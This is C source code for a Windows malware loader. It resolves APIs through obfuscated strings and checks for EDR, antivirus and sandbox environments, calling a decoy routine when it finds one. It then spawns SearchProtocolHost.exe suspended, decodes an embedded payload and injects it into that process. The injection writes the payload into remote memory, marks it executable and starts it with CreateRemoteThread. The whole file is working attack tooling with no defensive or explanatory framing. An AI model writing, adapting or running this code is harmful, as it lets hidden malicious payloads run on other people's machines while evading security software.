#include "detector.h"
#include "evasion.h"
#include "payload.h"

// Core Injection Logic
void StealthExec(HANDLE hProc, WINAPI_TABLE *api)
{
    PVOID memLoc = NULL;
    SIZE_T sz = payload_size + 1;
    HANDLE hThreadRemote;
    NTSTATUS status;
    ULONG oldProtect;

    // Decode the payload
    obfs_pdecode(DECKEY, payload, payload_size);

    status = CustAVM(hProc, &memLoc, 0, &sz, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (status != 0)
    {
        myDebug(DEBUG_ERROR, "NtAllocateVirtualMemory failed! Status: 0x%lX", status);
        return;
    }

    if (memLoc == NULL)
    {
        myDebug(DEBUG_ERROR, "Memory allocation failed, BaseAddress is NULL.");
        return;
    }
    else
    {
        myDebug(DEBUG_SUCCESS, "Successfully allocate memory.");
    }

    // Write DLL Path to Remote Process
    status = CustWVM(hProc, memLoc, (PVOID)payload, (ULONG)sz, NULL);
    if (status != 0)
    {
        myDebug(DEBUG_ERROR, "Memory write failed (Err: 0x%lX).", status);
        return;
    }
    else
    {
        myDebug(DEBUG_SUCCESS, "Successfully write memory.");
    }
    
    // Change Page Protection   
    status = CustPVM(hProc, &memLoc, &sz, PAGE_EXECUTE_READWRITE , &oldProtect);
    if (status != 0)
    {
        myDebug(DEBUG_ERROR, "Protect Memory change failed (Err: 0x%lX).", status);
        return;
    }
    else
    {
        myDebug(DEBUG_SUCCESS, "Successfully Protect Memory change.");
    }

    hThreadRemote = api->pCreateRemoteThread(hProc, NULL, 0, memLoc, NULL, 0, NULL);
    if (!hThreadRemote)
    {
        myDebug(DEBUG_ERROR, "Thread creation failed.");
        return;
    }
    else
    {
        myDebug(DEBUG_SUCCESS, "Thread creation succeed. Enjoy your payload !");
        DWORD waitResult = api->pWaitForSingleObject(hThreadRemote, (LPDWORD)5000); // Wait for 5 seconds
        while (((waitResult == WAIT_TIMEOUT) || (waitResult == WAIT_FAILED)))
        {
            waitResult = api->pWaitForSingleObject(hThreadRemote, (LPDWORD)5000); // we wait :)
        }
        api->pCloseHandle(hThreadRemote);
    }
    return;
}

BOOL _init_win_api(WINAPI_TABLE *api) {
    api->pLoadLibraryA = (pLoadLibraryA_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]LoadLibraryA"));
    if (!api->pLoadLibraryA)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve LoadLibraryA");
        return FALSE;
    }
    char *shlwapi = obfs_decode(DECKEY, "[OBFS_ENC]shlwapi.dll");
    HMODULE hShlwapi = api->pLoadLibraryA(shlwapi);
    free(shlwapi);
    if (!hShlwapi)
    {
        myDebug(DEBUG_ERROR, "Failed to load shlwapi");
        return FALSE;
    }
    api->pGetProcAddress = (pGetProcAddress_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]GetProcAddress"));
    if (!api->pGetProcAddress)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve GetProcAddress");
        return FALSE;
    }
    api->pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
    if (!api->pCloseHandle)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve CloseHandle");
        return FALSE;
    }
    api->pGetModuleFileNameA = (pGetModuleFileNameA_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]GetModuleFileNameA"));
    if (!api->pGetModuleFileNameA)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve GetModuleFileNameA");
        return FALSE;
    }
    api->pCreateFileA = (pCreateFileA_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CreateFileA"));
    if (!api->pCreateFileA)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve CreateFileA");
        return FALSE;
    }
    api->pGetFileSize = (pGetFileSize_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]GetFileSize"));
    if (!api->pGetFileSize)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve GetFileSize");
        return FALSE;
    }
    api->pWaitForSingleObject = (pWaitForSingleObject_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]WaitForSingleObject"));
    if (!api->pWaitForSingleObject)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve WaitForSingleObject");
        return FALSE;
    }
    api->pReadFile = (pReadFile_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]ReadFile"));
    if (!api->pReadFile)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve ReadFile");
        return FALSE;
    }
    api->pResumeThread = (pResumeThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]ResumeThread"));
    if (!api->pResumeThread)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve ResumeThread");
        return FALSE;
    }
    api->pStrStrIA = (pStrStrIA_t)api->pGetProcAddress(hShlwapi, obfs_decode(DECKEY, "[OBFS_ENC]StrStrIA"));
    if (!api->pStrStrIA)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve StrStrIA");
        return FALSE;
    }
    api->pFindClose = (pFindClose_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]FindClose"));
    if (!api->pFindClose)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve FindClose");
        return FALSE;
    }
    api->pQueryPerformanceFrequency = (pQueryPerformance_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]QueryPerformanceFrequency"));
    if (!api->pQueryPerformanceFrequency)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve QueryPerformanceFrequency");
        return FALSE;
    }
    api->pQueryPerformanceCounter = (pQueryPerformance_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]QueryPerformanceCounter"));
    if (!api->pQueryPerformanceCounter)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve QueryPerformanceCounter");
        return FALSE;
    }
    api->pCreateRemoteThread = (pCreateRemoteThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CreateRemoteThread"));
    if (!api->pCreateRemoteThread)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve CreateRemoteThread.");
        return false;
    }
    api->pCreateProcessA = (pCreateProcessA_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CreateProcessA"));
    if (!api->pCreateProcessA) {
        myDebug(DEBUG_ERROR, "Failed to resolve CreateProcessA");
        return false;
    }
    api->pGetModuleHandleA = (pGetModuleHandleA_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]GetModuleHandleA"));  
    if (!api->pGetModuleHandleA) {
        myDebug(DEBUG_ERROR, "Failed to resolve GetModuleHandleA");
        return false;
    }  
    api->pPathFileExistsA = (pPathFileExistsA_t)api->pGetProcAddress(hShlwapi, obfs_decode(DECKEY, "[OBFS_ENC]PathFileExistsA"));
    if (!api->pPathFileExistsA)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve PathFileExistsA");
        return FALSE;
    }
    api->pFreeLibrary = (pFreeLibrary_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]FreeLibrary")); 
    if (!api->pFreeLibrary)
    {
        myDebug(DEBUG_ERROR, "Failed to resolve FreeLibrary");
        return FALSE;
    }
    return TRUE;
}

// Entry Function
int main(int argc, char *argv[])
{
    WINAPI_TABLE api;
    if (!_init_win_api(&api)) {
        SortNumbers();
        return 0;
    }

    // Check For EDR/AV/Sandbox env
    if (PerfomChecksEnv(&api))
    {
        SortNumbers();
        return 0;
    }

    STARTUPINFOA sInfo = {0};
    PROCESS_INFORMATION pInfo = {0};

    char *procPath = "[OBFS_ENC]C:\\Windows\\System32\\SearchProtocolHost.exe";
    #if DEBUG
        char *procName = "[OBFS_ENC]SearchProtocolHost.exe";
    #endif

    if (!api.pCreateProcessA(obfs_decode(DECKEY, procPath), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
    {
        myDebug(DEBUG_ERROR, "Could not create %s.", procName);
        return -1;
    }

    myDebug(DEBUG_INFO, "Suspended %s created.", obfs_decode(DECKEY, procName));

    // Perform Injection
    StealthExec(pInfo.hProcess, &api);

    // Resume Execution
    api.pResumeThread(pInfo.hThread);
    api.pCloseHandle(pInfo.hProcess);
    api.pCloseHandle(pInfo.hThread);
    myDebug(DEBUG_INFO, "%s has resumed normally.", obfs_decode(DECKEY, procName));

    return 0;
}